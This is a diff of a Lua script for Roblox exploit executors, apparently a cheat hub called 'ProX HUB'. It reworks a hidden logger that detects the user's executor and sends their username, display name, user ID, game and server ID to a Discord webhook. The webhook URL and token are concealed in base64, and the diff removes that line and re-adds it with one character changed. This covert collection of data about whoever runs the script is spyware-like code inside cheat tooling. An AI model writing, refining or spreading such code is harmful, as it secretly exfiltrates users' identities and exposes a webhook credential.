@@ -284,11 +284,10 @@ end
 local http_request = http_request or request or syn.request or (http and http.request) or fluxus.request
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local WebhookURL = base64Decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM4NDcxNjg5MTY0MTIxNzIwNC91MEFKZFdhbXhrVFQway1rYlFubjRCV3NmaE53RUs1VTUyRkFwY1AwRjJ0cW1WRE9LanAwMmxOeko3bmYxYTJmemxjXw==")
 local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Base64 decoded webhook URL
+local WebhookURL = base64Decode("aHR0cHM6Ly9kaXNjb3JrYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM4NDcxNjg5MTY0MTIxNzIwNC91MEFKZFdhbXhrVFQway1rYlFubjRCV3NmaE53RUs1VTUyRkFwY1AwRjJ0cW1WRE9LanAwMmxOeko3bmYxYTJmemxjXw==")
 
 local EXECUTOR_COLORS = {
     ["Synapse X"] = 0x8A2BE2,
@@ -308,6 +307,7 @@ local EXECUTOR_COLORS = {
     ["Unknown Executor"] = 0xA9A9A9
 }
 
+-- Detect executor
 local function getExecutor()
     local executor = "Unknown Executor"
     if syn and syn.request then executor = "Synapse X"
@@ -329,12 +329,12 @@ local function getExecutor()
     end
 
     if executor == "Unknown Executor" and debug and debug.getregistry then
-        local reg = debug.getregistry()
-        for _, func in ipairs(reg) do
+        for _, func in ipairs(debug.getregistry()) do
             if type(func) == "function" and getfenv(func).script then
                 local source = getfenv(func).script:GetFullName()
                 if source:lower():find("executor") then
                     executor = "Custom Executor"
+                    break
                 end
             end
         end
@@ -343,45 +343,51 @@ local function getExecutor()
     return executor
 end
 
-
+-- Get game info
 local function getGameInfo()
     local placeId = game.PlaceId
     local jobId = game.JobId
-    
     local success, gameName = pcall(function()
         return game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
     end)
-    
     return {
         name = success and gameName or "Unknown Game",
         placeId = placeId,
         jobId = jobId,
-        url = string.format(base64Decode("aHR0cHM6Ly93d3cucm9ibG94LmNvbS9nYW1lcy8lZC8="), placeId)
+        url = string.format("https://www.roblox.com/games/%d", placeId)
     }
 end
 
+-- Get game icon thumbnail
+local function getGameThumbnail(placeId)
+    return string.format("https://www.roblox.com/thumbs/places/%d/420/420/Thumbnail.png", placeId)
+end
+
+-- Get player avatar headshot
+local function getAvatarUrl(userId)
+    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
+end
+
+-- Send webhook
 local function sendWebhook(action)
-    local username = LocalPlayer.Name
-    local displayName = LocalPlayer.DisplayName
     local executor = getExecutor()
     local gameInfo = getGameInfo()
     local timestamp = os.date("%Y-%m-%d %H:%M:%S", os.time())
-    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)
-    
     local embedColor = EXECUTOR_COLORS[executor] or 0x000000
-    
+
     local payload = {
         ["username"] = "ProX | Logger",
-        ["avatar_url"] = "https://i.imgur.com/5X7pG7s.jpeg",
+        ["avatar_url"] = getAvatarUrl(LocalPlayer.UserId),
         ["embeds"] = {{
             ["title"] = "ProX HUB Log",
-            ["url"] = "https://roblox.com/games/"..game.PlaceId,
-            ["description"] = string.format("**%s** has executed a script in **%s**", displayName, gameInfo.name),
+            ["url"] = gameInfo.url,
+            ["description"] = string.format("**%s** has executed a script in **%s**", LocalPlayer.DisplayName, gameInfo.name),
             ["color"] = embedColor,
             ["fields"] = {
                 {
                     ["name"] = "User Info",
-                    ["value"] = string.format("**Username:** [%s](%s)\n**Display Name:** %s", username, string.format("https://www.roblox.com/users/%d/profile", LocalPlayer.UserId), displayName),
+                    ["value"] = string.format("**Username:** [%s](https://www.roblox.com/users/%d/profile)\n**Display Name:** %s",
+                        LocalPlayer.Name, LocalPlayer.UserId, LocalPlayer.DisplayName),
                     ["inline"] = true
                 },
                 {
@@ -391,13 +397,13 @@ local function sendWebhook(action)
                 },
                 {
                     ["name"] = "Game Info",
-                    ["value"] = string.format("[%s](%s)\n**Place ID:** %d\n**Server ID:** %s", gameInfo.name, gameInfo.url, gameInfo.placeId, gameInfo.jobId),
+                    ["value"] = string.format("[%s](%s)\n**Place ID:** %d\n**Server ID:** %s",
+                        gameInfo.name, gameInfo.url, gameInfo.placeId, gameInfo.jobId),
                     ["inline"] = false
                 }
             },
-            ["thumbnail"] = {["url"] = avatarUrl},
-            ["image"] = {["url"] = "https://i.imgur.com/FVHQHHc.jpeg"},
-            ["footer"] = {["text"] = string.format("ProX Logger • %s", timestamp), ["icon_url"] = "https://i.imgur.com/5X7pG7s.jpeg"},
+            ["thumbnail"] = {["url"] = getGameThumbnail(gameInfo.placeId)}, -- game icon
+            ["footer"] = {["text"] = string.format("ProX Logger • %s", timestamp), ["icon_url"] = getAvatarUrl(LocalPlayer.UserId)}, -- player headshot
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
         }}
     }
@@ -410,7 +416,7 @@ local function sendWebhook(action)
             Body = HttpService:JSONEncode(payload)
         })
     end)
-    
+
     if not success then
         warn("Failed to send webhook:", err)
     end
